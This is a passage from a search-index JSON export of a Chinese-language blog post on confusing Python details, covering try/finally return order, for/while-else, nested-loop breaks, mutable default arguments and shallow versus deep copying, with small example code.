\u8bed\u53e5\u7ed3\u675f\u524d\u6267\u884c\u7684\u6700\u540e\u4e00\u9879\u4efb\u52a1\u3002\u4e0d\u8bba <code>try</code> \u8bed\u53e5\u662f\u5426\u89e6\u53d1\u5f02\u5e38\uff0c\u90fd\u4f1a\u6267\u884c <code>finally</code> \u5b50\u53e5\u3002\u4ee5\u4e0b\u5185\u5bb9\u4ecb\u7ecd\u4e86\u51e0\u79cd\u6bd4\u8f83\u590d\u6742\u7684\u89e6\u53d1\u5f02\u5e38\u60c5\u666f\uff1a</p> <ul> <li>\u5982\u679c\u6267\u884c <code>try</code> \u5b50\u53e5\u671f\u95f4\u89e6\u53d1\u4e86\u67d0\u4e2a\u5f02\u5e38\uff0c\u5219\u67d0\u4e2a <code>except</code> \u5b50\u53e5\u5e94\u5904\u7406\u8be5\u5f02\u5e38\u3002\u5982\u679c\u8be5\u5f02\u5e38\u6ca1\u6709 <code>except</code> \u5b50\u53e5\u5904\u7406\uff0c\u5728 <code>finally</code> \u5b50\u53e5\u6267\u884c\u540e\u4f1a\u88ab\u91cd\u65b0\u89e6\u53d1\u3002</li> <li><code>except</code> \u6216 <code>else</code> \u5b50\u53e5\u6267\u884c\u671f\u95f4\u4e5f\u4f1a\u89e6\u53d1\u5f02\u5e38\u3002 \u540c\u6837\uff0c\u8be5\u5f02\u5e38\u4f1a\u5728 <code>finally</code> \u5b50\u53e5\u6267\u884c\u4e4b\u540e\u88ab\u91cd\u65b0\u89e6\u53d1\u3002\u5982\u679c <code>finally</code> \u5b50\u53e5\u4e2d\u5305\u542b <code>break</code>\u3001<code>continue</code> \u6216 <code>return</code> \u7b49\u8bed\u53e5\uff0c\u5f02\u5e38\u5c06\u4e0d\u4f1a\u88ab\u91cd\u65b0\u5f15\u53d1\u3002</li> <li>\u5982\u679c\u6267\u884c <code>try</code> \u8bed\u53e5\u65f6\u9047\u5230 <code>break</code>\u3001<code>continue</code> \u6216 <code>return</code> \u8bed\u53e5\uff0c\u5219 <code>finally</code> \u5b50\u53e5\u5728\u6267\u884c <code>break</code>\u3001<code>continue</code> \u6216 <code>return</code> \u8bed\u53e5\u4e4b\u524d\u6267\u884c\u3002</li> <li>\u5982\u679c <code>finally</code> \u5b50\u53e5\u4e2d\u5305\u542b <code>return</code> \u8bed\u53e5\uff0c\u5219\u8fd4\u56de\u503c\u6765\u81ea <code>finally</code> \u5b50\u53e5\u7684\u67d0\u4e2a <code>return</code> \u8bed\u53e5\u7684\u8fd4\u56de\u503c\uff0c\u800c\u4e0d\u662f\u6765\u81ea <code>try</code> \u5b50\u53e5\u7684 <code>return</code> \u8bed\u53e5\u7684\u8fd4\u56de\u503c\u3002</li> </ul> <p>\u73b0\u5728\uff0c\u6211\u4eec\u5df2\u7ecf\u638c\u63e1\u4e86\u5173\u4e8e <code>try</code> \u8bed\u53e5\u5757\u4e2d <code>return</code> \u548c <code>finally</code> \u7684\u6267\u884c\u987a\u5e8f\u7684\u6240\u6709\u77e5\u8bc6\uff0c\u6765\u5f00\u59cb\u6b22\u4e50\u5730\u505a\u9898\u5427\uff1a</p> <p>\u8bf7\u5206\u6790\u4ee5\u4e0b\u4e09\u4e2a <code>test()</code> \u51fd\u6570\uff0c\u5e76\u8bf4\u660e\u51fd\u6570\u6267\u884c\u7684\u6700\u7ec8\u7ed3\u679c\uff08\u8fd4\u56de\u503c\uff1f\u629b\u51fa\u5f02\u5e38\uff1f\u63a7\u5236\u53f0\u8f93\u51fa\uff1f\uff09</p> \u30101\u3011raise \u5728\u8fd4\u56de\u4e4b\u524d\u8fd8\u662f\u4e4b\u540e\u6267\u884c<pre><code>def test():\n    try:\n        return 1\n    finally:\n        raise Exception('error')\n</code></pre> \u30102\u3011test2() \u7a76\u7adf\u4f1a\u4e0d\u4f1a\u88ab\u6267\u884c<pre><code>def test2():\n    print('test2!')\n    return 2\n\ndef test():\n    try:\n        return test2()\n    finally:\n        raise Exception('error')\n</code></pre> \u30103\u3011\u5728 except \u4e2d\u5305\u542b return<pre><code>def test():\n    try:\n        return 1 / 0\n    except ZeroDivisionError:\n        return 2\n    finally:\n        return 3\n</code></pre> \u7b54\u6848 <p>\u30101\u3011\u4e2d\u7684\u51fd\u6570\u6700\u7ec8\u4ee5 <code>raise Exception</code> \u544a\u7ec8\u5e76\u4e14\u4e0d\u4f1a\u5bf9\u5916\u8fd4\u56de\u4efb\u4f55\u503c\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u629b\u51fa\u5f02\u5e38\u53d1\u751f\u4e8e\u8fd4\u56de\u7ed3\u679c\u4e4b\u524d\uff0c\u8fd9\u662f\u975e\u5e38\u5bb9\u6613\u5c31\u80fd\u770b\u51fa\u6765\u7684\u3002</p> <p>\u30102\u3011\u7684\u7ed3\u679c\u53ef\u80fd\u4f1a\u51fa\u4e4e\u5f88\u591a\u4eba\u7684\u610f\u6599\uff0c\u51fd\u6570\u4f1a\u5148\u5411\u63a7\u5236\u53f0\u6253\u5370 <code>test2!</code>\uff0c\u7136\u540e\u63a5\u4e0b\u6765\u548c\u30101\u3011\u4e2d\u7684\u51fd\u6570\u4e00\u6837\uff0c\u629b\u51fa\u5f02\u5e38\u5e76\u4e14\u4e0d\u4f1a\u5bf9\u5916\u8fd4\u56de\u4efb\u4f55\u503c\u3002</p> <p>\u8fd9\u610f\u5473\u7740\u89e3\u91ca\u5668\u4f1a\u5148\u5c06 <code>return</code> \u8bed\u53e5\u5757\u4e2d\u7684\u7ed3\u679c\uff08\u5373 <code>test2()</code> \u51fd\u6570\uff09\u8ba1\u7b97\u5e76\u5165\u6808\uff0c\u7136\u540e\u5c06 <code>return</code> \u8bed\u53e5\u5757\u5165\u6808\uff0c\u7136\u540e\u518d\u5c06 <code>finally</code> \u8bed\u53e5\u5757\u5165\u6808\u3002\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48 <code>test2()</code> \u51fd\u6570\u4f1a\u88ab\u6267\u884c\u7684\u539f\u56e0\u3002</p> <p>\u30103\u3011\u4e2d\u7684\u51fd\u6570\u6700\u7ec8\u4f1a\u8fd4\u56de <code>3</code>\uff0c\u8fd9\u5728 Python \u6587\u6863\u4e2d\u5e76\u6ca1\u6709\u63d0\u53ca\uff08\u5c5e\u4e8e\u662f\u4e00\u4e2a\u6587\u6863\u76f2\u533a\uff09\uff0c\u8fd9\u540c\u6837\u53ef\u4ee5\u7528\u30102\u3011\u7684\u8c03\u7528\u6808\u7684\u601d\u8def\u6765\u89e3\u91ca\u3002</p>","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#12-for-else","title":"1.2 <code>for</code> \u8bed\u53e5\u5757\u4e2d\uff0c<code>else</code> \u8bed\u53e5\u5757\u7684\u4f5c\u7528","text":"<p>\u8003\u8651\u4ee5\u4e0b\u60c5\u5f62\uff0c\u63a8\u6d4b\u63a7\u5236\u53f0\u7684\u6253\u5370\u7ed3\u679c\uff1a</p> <pre><code>for i in range(10):\n    print(i)\n    if i == 5:\n        break\nelse:\n    print('finish')\n</code></pre> <p>\u8fd9\u4e2a\u672c\u6765\u662f\u4e00\u4ef6\u5f88\u7b80\u5355\u7684\u4e8b\u60c5\uff0c\u5373\u63a7\u5236\u53f0\u4f1a\u9010\u884c\u6253\u5370 <code>0</code> \u5230 <code>5</code>\uff0c\u7136\u540e\u7ed3\u675f\uff0c\u5e76\u4e14\u4e0d\u4f1a\u5411\u63a7\u5236\u53f0\u6253\u5370 <code>finish</code>\u3002</p> <p>\u4ee4\u4eba\u9057\u61be\u7684\u662f\uff0c\u5f88\u591a\u4e2d\u6587\u7684 Python \u6559\u5b66\u4e66\u7c4d\u4e2d\u5f80\u5f80\u5fd8\u8bb0\u5c06 <code>else</code> \u5b50\u53e5\u7684\u4f5c\u7528\u63d0\u53ca\uff0c\u8fd9\u5c31\u5bfc\u81f4\u4e86\u5f88\u591a\u4eba\u5bf9 <code>for</code> \u8bed\u53e5\u5757\u4e2d\u7684 <code>else</code> \u5b50\u53e5\u7684\u4f5c\u7528\u4e00\u77e5\u534a\u89e3\u3002</p> <p><code>for</code> \u8bed\u53e5\u5757\u4e2d\u7684 <code>else</code> \u5b50\u53e5\u7684\u4f5c\u7528\u662f\uff0c\u5f53 <code>for</code> \u8bed\u53e5\u5757\u4e2d\u7684 <code>break</code> \u8bed\u53e5\u6ca1\u6709\u88ab\u6267\u884c\u65f6\uff0c\u6267\u884c <code>else</code> \u5b50\u53e5\u5757\u4e2d\u7684\u8bed\u53e5\u3002</p> <p>\u90e8\u5206\u7f51\u7ad9\u4e0a\u4e8e\u8be5 <code>else</code> \u5b50\u53e5\u7684\u7528\u6cd5\u4e5f\u5b58\u5728\u9519\u8bef\u63cf\u8ff0\uff0c\u4f8b\u5982 \u201c\u5f53 <code>for</code> \u8bed\u53e5\u7684\u8fed\u4ee3\u884c\u4e3a\u6ca1\u6709\u6b63\u5e38\u7ed3\u675f\u65f6\uff0c\u6267\u884c <code>else</code> \u5b50\u53e5\u5757\u4e2d\u7684\u8bed\u53e5\u201d\uff0c\u8fd9\u662f\u4e0d\u6b63\u786e\u7684\uff0c\u56e0\u4e3a\u4f60\u53ef\u4ee5\u901a\u8fc7 <code>return</code> \u751a\u81f3\u662f <code>raise</code> \u8bed\u53e5\u6765\u63d0\u524d\u7ed3\u675f <code>for</code> \u8bed\u53e5\u5757\u7684\u8fed\u4ee3\u884c\u4e3a\uff0c\u800c\u8fd9\u5e76\u4e0d\u4f1a\u5bfc\u81f4 <code>else</code> \u5b50\u53e5\u5757\u4e2d\u7684\u8bed\u53e5\u88ab\u6267\u884c\u3002</p>","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#13-while-else","title":"1.3 <code>while</code> \u8bed\u53e5\u5757\u4e2d\uff0c<code>else</code> \u8bed\u53e5\u5757\u7684\u4f5c\u7528","text":"<p>\u540c\u4e0a\uff0c\u8fd9\u6b21\u5c31\u4e0d\u8d58\u8ff0\u4e86\uff0c\u76f4\u63a5\u8bf4\u7ed3\u8bba\uff1a\u5f53 <code>while</code> \u8bed\u53e5\u7684\u5faa\u73af\u6761\u4ef6\u4e3a <code>False</code> \u65f6\uff0c\u6267\u884c <code>else</code> \u5b50\u53e5\u5757\u4e2d\u7684\u8bed\u53e5\u3002\u540c\u7406\uff0c<code>return</code> \u548c <code>raise</code> \u8bed\u53e5\u4e5f\u4e0d\u4f1a\u5bfc\u81f4 <code>else</code> \u5b50\u53e5\u5757\u4e2d\u7684\u8bed\u53e5\u88ab\u6267\u884c\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>i = 0\nwhile i &lt; 10:\n    print(i)\n    i += 1\nelse:\n    print('finish')\n</code></pre> <p>\u63a7\u5236\u53f0\u4f1a\u9010\u884c\u6253\u5370 <code>0</code> \u5230 <code>9</code> \u540e\uff0c\u518d\u6253\u5370 <code>finish</code>\u3002</p>","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#14-for-break","title":"1.4 \u5d4c\u5957 <code>for</code> \u8bed\u53e5\u5757\u4e2d\uff0c<code>break</code> \u5982\u4f55\u8df3\u51fa\u5168\u90e8\u5faa\u73af","text":"<p>\u6211\u4eec\u90fd\u77e5\u9053\uff0c\u5728 Python \u4e2d\uff0c\u5982\u679c\u5728\u5d4c\u5957\u7684 <code>for</code> \u5faa\u73af\u4e2d\u4f7f\u7528 <code>break</code> \u8bed\u53e5\uff0c\u53ea\u4f1a\u8df3\u51fa\u6700\u8fd1\u7684\u4e00\u5c42\u5faa\u73af\uff0c\u800c\u4e0d\u4f1a\u8df3\u51fa\u6240\u6709\u7684\u5faa\u73af\u3002</p> <p>\u8fd9\u662f\u4e00\u4ef6\u5f88\u5934\u5927\u7684\u4e8b\u60c5\uff0c\u5728\u67d0\u4e9b\u60c5\u5f62\u4e0b\uff0c\u6211\u4eec\u5e0c\u671b\u8be5 <code>break</code> \u8bed\u53e5\u80fd\u591f\u8df3\u51fa\u6240\u6709\u7684\u5faa\u73af\uff08\u4f8b\u5982\u5728\u5d4c\u5957\u5faa\u73af\u4e2d\u5bfb\u627e\u7279\u5b9a\u7b54\u6848\uff09\u3002</p> <p>\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5148\u524d\u63d0\u5230\u7684 <code>for</code> \u8bed\u53e5\u5757\u4e2d\u7684 <code>else</code> \u8bed\u53e5\u5757\u6765\u5b9e\u73b0\u8fd9\u4e00\u76ee\u6807\u3002\u4f8b\u5982\uff0c\u6211\u5e0c\u671b <code>i</code> \u548c <code>j</code> \u90fd\u4e3a <code>5</code> \u65f6\u8df3\u51fa\u4e24\u5c42\u5faa\u73af\uff1a</p> <pre><code>for i in range(10):\n    for j in range(10):\n        print(i, j)\n        if i == j == 5:\n            break\n</code></pre> <p>\u4e0a\u9762\u7684\u4f8b\u5b50\u663e\u7136\u4e0d\u80fd\u6ee1\u8db3\u9700\u6c42\uff0c\u8be5\u5faa\u73af\u53ea\u4f1a\u5728 <code>i == j == 5</code> \u65f6\u8df3\u51fa <code>for j in range(10)</code> \u7684\u5355\u5c42\u5faa\u73af\u3002\u5e76\u4e14\u53ef\u4ee5\u770b\u5230\uff0c\u63a7\u5236\u53f0\u4ecd\u5c06\u7ee7\u7eed\u6253\u5370\u540e\u7eed\u5faa\u73af\u7684\u7ed3\u679c\u76f4\u5230\u8f93\u51fa <code>9 9</code> \u624d\u7ed3\u675f\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u5229\u7528 <code>else</code> \u5b50\u53e5\u5757\u6765\u5b9e\u73b0\u6211\u4eec\u7684\u76ee\u6807\uff1a</p> <pre><code>for i in range(10):\n    for j in range(10):\n        print(i, j)\n        if i == j == 5:\n            break\n    else:\n        continue\n    break\n</code></pre> <p>\u8fd9\u6837\uff0c\u63a7\u5236\u53f0\u6700\u540e\u4e00\u884c\u7684\u8f93\u51fa\u7ed3\u679c\u5c06\u4f1a\u662f <code>5 5</code>\u3002</p>","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#_2","title":"\u4e8c\u3001\u53ef\u53d8\u5bf9\u8c61","text":"","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#21","title":"2.1 \u9ed8\u8ba4\u53c2\u6570\u53ef\u53d8\u7684\u5371\u9669\u6027","text":"<pre><code>def test(a=[]):\n    a.append(1)\n    print(a)\n</code></pre> <p>\u5728\u6211\u7684\u535a\u5ba2 Python \u9ed8\u8ba4\u53c2\u6570\u53ef\u53d8\u7684\u5371\u9669\u6027 \u4e2d\u5df2\u7ecf\u8be6\u7ec6\u5730\u8bb2\u8ff0\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u5c31\u4e0d\u8d58\u8ff0\u4e86\u3002</p> <p>\u8fd9\u91cc\u76f4\u63a5\u8bf4\u7ed3\u8bba\uff1a\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u6bcf\u6b21\u8c03\u7528 <code>test()</code> \u51fd\u6570\u65f6\uff0c\u51fd\u6570\u5f62\u53c2 <code>a</code> \u7684\u9ed8\u8ba4\u503c\u90fd\u4f1a\u53d1\u751f\u6539\u53d8\uff0c\u5373\u6bcf\u6b21\u90fd\u4f1a\u5411\u8be5\u5217\u8868\u4e2d\u8ffd\u52a0\u6574\u6570 <code>1</code>\u3002\u5373\uff1a</p> <pre><code>&gt;&gt;&gt; test()\n[1]\n&gt;&gt;&gt; test()\n[1, 1]\n&gt;&gt;&gt; test()\n[1, 1, 1]\n</code></pre> <p>\u8fd9\u662f\u56e0\u4e3a\uff0c\u51fd\u6570\u5b9a\u4e49\u65f6\uff0c\u6240\u6709\u7684\u5f62\u53c2\u9ed8\u8ba4\u503c\u4f1a\u88ab\u521d\u59cb\u5316\uff0c\u7136\u540e\u5b58\u5230 <code>__defaults__</code> \u5143\u7ec4\u4e2d\u3002</p> <p>\u7136\u800c\uff0c\u8fd9\u6837\u7684\u521d\u59cb\u5316\u53ea\u5728\u51fd\u6570\u88ab\u5b9a\u4e49\u65f6\u53d1\u751f\uff0c\u800c\u4e0d\u662f\u5728\u88ab\u8c03\u7528\u65f6\u53d1\u751f\u3002\u6545\u6bcf\u6b21\u88ab <code>append(1)</code> \u7684\u672c\u8d28\u4e0a\u8fd8\u662f\u540c\u4e00\u4e2a\u5217\u8868\u3002 </p>","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#22","title":"2.2 \u53ef\u53d8\u5bf9\u8c61\u7684\u62f7\u8d1d","text":"<p>\u8fd9\u662f\u4e00\u4e2a\u9762\u8bd5\u4e2d\u7ecf\u5e38\u88ab\u95ee\u5230\u7684\u95ee\u9898\uff0c\u4f60\u7684\u9762\u8bd5\u5b98\u95f2\u7684\u6ca1\u4e8b\u5c31\u4f1a\u6765\u8003\u5bdf\u4f60\u8fd9\u4e2a\u77e5\u8bc6\u70b9\u3002\u8fd9\u4e2a\u95ee\u9898\u7684\u5173\u952e\u5728\u4e8e\u4f60\u5bf9 Python \u53ef\u53d8\u5bf9\u8c61\u7684\u5185\u5b58\u5b9e\u73b0\u7684\u7406\u89e3\u3002</p> <p>\u8003\u8651\u4ee5\u4e0b\u4e24\u4e2a\u4f8b\u5b50\uff1a</p> <pre><code>a = [1, 2, 3]\nb = a\nb[0] = 0\nprint(a)  # [0, 2, 3]\n</code></pre> <pre><code>a = [1, 2, 3]\nb = a.copy()\nb[0] = 0\nprint(a)  # [1, 2, 3]\n</code></pre> <p>\u5728\u7b2c\u4e00\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u5c06 <code>a</code> \u8d4b\u503c\u7ed9 <code>b</code>\uff0c\u7136\u540e\u4fee\u6539 <code>b</code> \u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\uff0c\u8fd9\u65f6 <code>a</code> \u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u4e5f\u88ab\u4fee\u6539\u4e86\u3002\u8fd9\u662f\u56e0\u4e3a\uff0c<code>a</code> \u548c <code>b</code> \u90fd\u6307\u5411\u4e86\u540c\u4e00\u4e2a\u5185\u5b58\u5730\u5740\uff0c\u6240\u4ee5\u4fee\u6539 <code>b</code> \u7684\u503c\uff0c\u4e5f\u5c31\u662f\u4fee\u6539\u4e86 <code>a</code> \u6307\u5411\u7684\u5185\u5b58\u5730\u5740\u4e2d\u7684\u503c\u3002</p> <p>\u4f60\u751a\u81f3\u53ef\u4ee5\u628a\u4e0a\u9762\u4e24\u4e2a\u4f8b\u5b50\u6539\u5199\u6210 C \u8bed\u8a00\u7684\u5f62\u5f0f\uff1a</p> <pre><code>int a[3] = {1, 2, 3};\nint *b = a;\nb[0] = 0;\nprintf(\"%d %d %d\\n\", a[0], a[1], a[2]);  // 0 2 3\n</code></pre> <pre><code>int a[3] = {1, 2, 3};\nint b[3];\nmemcpy(b, a, sizeof(a));\nb[0] = 0;\nprintf(\"%d %d %d\\n\", a[0], a[1], a[2]);  // 1 2 3\n</code></pre> <p>\u540e\u8005\u8fd9\u6837\u7684\u884c\u4e3a\u88ab\u79f0\u4e3a\u5bf9\u8c61\u7684\uff08\u6d45\uff09\u62f7\u8d1d\uff0c\u9664\u4e86\u4f7f\u7528 <code>a.copy()</code> \u5916\uff0c\u4f60\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u7684\u65b9\u5f0f\u5b9e\u73b0\u5bf9\u8c61\u7684\u6d45\u62f7\u8d1d\uff1a</p> <pre><code>b = a[:]\nb = list(a)\nb = a * 1\nb = a + []\nb = [i for i in a]\n</code></pre> <p>\uff08Python \u6587\u6863\uff09copy --- \u6d45\u5c42 (shallow) \u548c\u6df1\u5c42 (deep) \u590d\u5236\u64cd\u4f5c</p> <p>Python \u7684\u8d4b\u503c\u8bed\u53e5\u4e0d\u590d\u5236\u5bf9\u8c61\uff0c\u800c\u662f\u521b\u5efa\u76ee\u6807\u548c\u5bf9\u8c61\u7684\u7ed1\u5b9a\u5173\u7cfb\u3002\u5bf9\u4e8e\u81ea\u8eab\u53ef\u53d8\uff0c\u6216\u5305\u542b\u53ef\u53d8\u9879\u7684\u96c6\u5408\uff0c\u6709\u65f6\u8981\u751f\u6210\u526f\u672c\u7528\u4e8e\u6539\u53d8\u64cd\u4f5c\uff0c\u800c\u4e0d\u5fc5\u6539\u53d8\u539f\u59cb\u5bf9\u8c61\u3002</p>","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#23","title":"2.3 \u6d45\u62f7\u8d1d\u4e0e\u6df1\u62f7\u8d1d","text":"<p>\u5728\u524d\u9762\u5df2\u7ecf\u7b80\u5355\u4ecb\u7ecd\u4e86\u62f7\u8d1d\u7684\u6982\u5ff5\uff0c\u65e2\u7136\u63d0\u5230\u4e86\u62f7\u8d1d\uff0c\u5c31\u4e0d\u5f97\u4e0d\u63d0\u5230\u6d45\u62f7\u8d1d\u4e0e\u6df1\u62f7\u8d1d\u3002</p> <p>\u5728 Python \u9ed8\u8ba4\u53c2\u6570\u53ef\u53d8\u7684\u5371\u9669\u6027 \u4e2d\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\uff1a</p> <ul> <li>\u5982\u679c\u6709\u591a\u4e2a\u5bf9\u8c61\u7684\u5f15\u7528\uff08\u5373\u6307\u9488\uff09\u6307\u5411\u540c\u4e00\u4e2a\u53ef\u53d8\u5bf9\u8c61\uff0c\u90a3\u4e48\u4f7f\u7528\u5176\u4e2d\u4efb\u610f\u4e00\u4e2a\u5f15\u7528\u5bf9\u6b64\u5bf9\u8c61\u8fdb\u884c\u4fee\u6539\uff0c\u5176\u4ed6\u6240\u6709\u7684\u5f15\u7528\u90fd\u4f1a\u4ea7\u751f\u76f8\u540c\u7684\u4fee\u6539\u3002    </li> <li>\u5982\u679c\u6709\u591a\u4e2a\u5bf9\u8c61\u7684\u5f15\u7528\u6307\u5411\u540c\u4e00\u4e2a\u4e0d\u53ef\u53d8\u5bf9\u8c61\uff0c\u5f53\u4f7f\u7528\u5176\u4e2d\u4efb\u610f\u4e00\u4e2a\u5f15\u7528\u5bf9\u6b64\u5bf9\u8c61\u8fdb\u884c\u4fee\u6539\uff0c\u7cfb\u7edf\u5c06\u4f1a\u5f00\u8f9f\u4e00\u5757\u65b0\u7684\u5185\u5b58\u533a\u57df\u7528\u6765\u5b58\u50a8\u4fee\u6539\u8fc7\u540e\u7684\u503c\uff0c\u5176\u4ed6\u6240\u6709\u7684\u5f15\u7528\u4ecd\u7136\u6307\u5411\u539f\u6765\u90a3\u7247\u5185\u5b58\u7a7a\u95f4\u3002    </li> </ul> <p>\u6d45\u62f7\u8d1d\u4e0e\u6df1\u62f7\u8d1d\u7684\u76f8\u540c\u70b9\u5728\u4e8e\uff0c\u5b83\u4eec\u90fd\u4f1a\u521b\u5efa\u5e76\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u5bf9\u8c61\u3002\u5b83\u4eec\u7684\u533a\u522b\u5728\u4e8e\u5bf9\u53ef\u53d8\u5bf9\u8c61\u7684\u5904\u7406\u4e0a\u3002</p> <p>\u82e5\u539f\u5bf9\u8c61\u4e2d\u6709\u4e00\u4e2a\u5143\u7d20\u662f\u53ef\u53d8\u5bf9\u8c61\uff0c\u6d45\u62f7\u8d1d\u4f1a\u5c06\u8be5\u53ef\u53d8\u5bf9\u8c61\u7684\u5f15\u7528\u76f4\u63a5\u5b58\u50a8\u5728\u65b0\u5bf9\u8c61\u4e2d\uff0c\u800c\u6df1\u62f7\u8d1d\u4f1a\u5148\u5c06\u8be5\u53ef\u53d8\u5bf9\u8c61\u62f7\u8d1d\u4e00\u4efd\u5230\u65b0\u7684\u5185\u5b58\u533a\u57df\uff0c\u518d\u5c06\u8be5\u53ef\u53d8\u5bf9\u8c61\u7684\u526f\u672c\u7684\u5f15\u7528\u5b58\u50a8\u5728\u65b0\u5bf9\u8c61\u4e2d\u3002</p> <p>\u6216\u8005\u4f7f\u7528 \u6587\u6863 \u4e2d\u6240\u8ff0\uff1a</p> <p>\u6d45\u5c42\u4e0e\u6df1\u5c42\u590d\u5236\u7684\u533a\u522b</p> <p>\u6d45\u5c42\u4e0e\u6df1\u5c42\u590d\u5236\u7684\u533a\u522b\u4ec5\u4e0e\u590d\u5408\u5bf9\u8c61\uff08\u5373\u5305\u542b\u5217\u8868\u6216\u7c7b\u7684\u5b9e\u4f8b\u7b49\u5176\u4ed6\u5bf9\u8c61\u7684\u5bf9\u8c61\uff09\u76f8\u5173\uff1a</p> <ul> <li>\u6d45\u5c42\u590d\u5236 \u6784\u9020\u4e00\u4e2a\u65b0\u7684\u590d\u5408\u5bf9\u8c61\uff0c\u7136\u540e\uff08\u5728\u5c3d\u53ef\u80fd\u7684\u8303\u56f4\u5185\uff09\u5c06\u539f\u59cb\u5bf9\u8c61\u4e2d\u627e\u5230\u7684\u5bf9\u8c61\u7684\u5f15\u7528\u63d2\u5165\u5176\u4e2d\u3002</li> <li>\u6df1\u5c42\u590d\u5236 \u6784\u9020\u4e00\u4e2a\u65b0\u7684\u590d\u5408\u5bf9\u8c61\uff0c\u7136\u540e\uff0c\u9012\u5f52\u5730\u5c06\u5728\u539f\u59cb\u5bf9\u8c61\u91cc\u627e\u5230\u7684\u5bf9\u8c61\u7684\u526f\u672c\u63d2\u5165\u5176\u4e2d\u3002</li> </ul> <p>\u4ee5\u4e0b\u662f 3 \u79cd\u62f7\u8d1d\u65b9\u5f0f\u7684\u5bf9\u6bd4\uff1a</p> <pre><code>import copy\n\na = [1, 2, 3, [4, 5]]\nb = a.copy()\nc = copy.copy(a)\nd = copy.deepcopy(a)\n\na[0] = 0\na[3][0] = 0\n\nprint(a)  # [0, 2, 3, [0, 5]]\nprint(b)  # [1, 2, 3, [0, 5]]\nprint(c)  # [1, 2, 3, [0, 5]]\nprint(d)  # [1, 2, 3, [4, 5]]\n</code></pre> <p><code>b = a.copy()</code> \u548c <code>c = copy.copy(a)</code> \u662f\u7b49\u4ef7\u7684\uff0c\u4ed6\u4eec\u90fd\u662f\u6d45\u62f7\u8d1d\uff0c\u800c <code>d = copy.deepcopy(a)</code> \u662f\u6df1\u62f7\u8d1d\u3002</p> <p>\u5217\u8868 <code>a</code> \u4e2d\u5305\u542b\u4e86 4 \u4e2a\u5143\u7d20\uff0c\u524d\u4e09\u4e2a\u5143\u7d20 <code>1</code>, <code>2</code>, <code>3</code> \u662f\u4e0d\u53ef\u53d8\u5bf9\u8c61\uff0c\u7b2c\u56db\u4e2a\u5143\u7d20 <code>[4, 5]</code> \u662f\u53ef\u53d8\u5bf9\u8c61\u3002</p> <p></p> <p>\u4e0a\u56fe\uff0c\u540c\u4e00\u4e2a\u989c\u8272\u8868\u793a\u540c\u4e00\u4e2a\u5730\u5740\u3002\u5728\u6d45\u62f7\u8d1d\u4e2d\uff0c\u539f\u59cb\u5bf9\u8c61 <code>a</code> \u548c\u526f\u672c <code>b</code> \u548c <code>c</code> \u4e2d\u7b2c\u56db\u4e2a\u5143\u7d20 <code>[4, 5]</code>\uff08\u8bb0\u4e3a <code>inner_list</code>\uff09\u7684\u5730\u5740\u662f\u76f8\u540c\u7684\uff0c\u800c\u5728\u6df1\u62f7\u8d1d\u4e2d\uff0c\u539f\u59cb\u5bf9\u8c61 <code>a</code> \u548c\u526f\u672c <code>d</code> \u4e2d\u7b2c\u56db\u4e2a\u5143\u7d20 <code>[4, 5]</code>\uff08\u8bb0\u4e3a <code>inner_list2</code>\uff09\u7684\u5730\u5740\u662f\u4e0d\u540c\u7684\u3002</p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u5f53\u6211\u4eec\u4fee\u6539\u539f\u59cb\u5217\u8868\u4e2d\u4e00\u4e2a\u4e0d\u53ef\u53d8\u5bf9\u8c61\u5143\u7d20\u65f6\uff0c\u6d45\u62f7\u8d1d\u548c\u6df1\u62f7\u8d1d\u7684\u7ed3\u679c\u90fd\u4e0d\u4f1a\u968f\u4e4b\u6539\u53d8\uff0c\u800c\u5f53\u4fee\u6539\u7684\u662f\u4e00\u4e2a\u53ef\u53d8\u5bf9\u8c61\u65f6\uff0c\u6d45\u62f7\u8d1d\u7684\u7ed3\u679c\u4f1a\u968f\u4e4b\u6539\u53d8\uff0c\u800c\u6df1\u62f7\u8d1d\u7684\u7ed3\u679c\u4e0d\u4f1a\u968f\u4e4b\u6539\u53d8\u3002</p>","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#24","title":"2.4 \u5728\u4e00\u884c\u4e2d\u540c\u65f6\u5b9a\u4e49\u548c\u8d4b\u503c\u591a\u4e2a\u53d8\u91cf","text":"<p>\u6709\u4e00\u79cd\u770b\u8d77\u6765\u5f88\u9177\u7684\u5199\u6cd5\u662f\uff1a</p> <pre><code>a = b = c = 0\n</code></pre> <p>\u4f46\u662f\u8fd9\u6837\u5199\u5c31\u6709\u95ee\u9898\u4e86\uff1a</p> <pre><code>a = b = c = []\n</code></pre> <p>\u8fd9\u540c\u6837\u662f\u56e0\u4e3a\u6ca1\u6709\u4f7f\u7528\u62f7\u8d1d\uff0c\u4e0a\u9762\u8fd9\u79cd\u5199\u6cd5\u76f8\u5f53\u4e8e\uff1a</p> <pre><code>a = []\nb = a\nc = a\n</code></pre> <p>\u8fd9\u6837\u5199\u7684\u9690\u60a3\u662f\uff0c\u5f53\u6211\u4eec\u4fee\u6539 <code>a</code> \u7684\u503c\u65f6\uff0c<code>b</code> \u548c <code>c</code> \u7684\u503c\u4e5f\u4f1a\u968f\u4e4b\u6539\u53d8\u3002</p> <p>\u5982\u679c\u6211\u4eec\u786e\u5b9e\u60f3\u5b9a\u4e49\u4e09\u4e2a\u7a7a\u5217\u8868\uff0c\u90a3\u4e48\u53ef\u4ee5\u8fd9\u6837\u5199\uff1a</p> 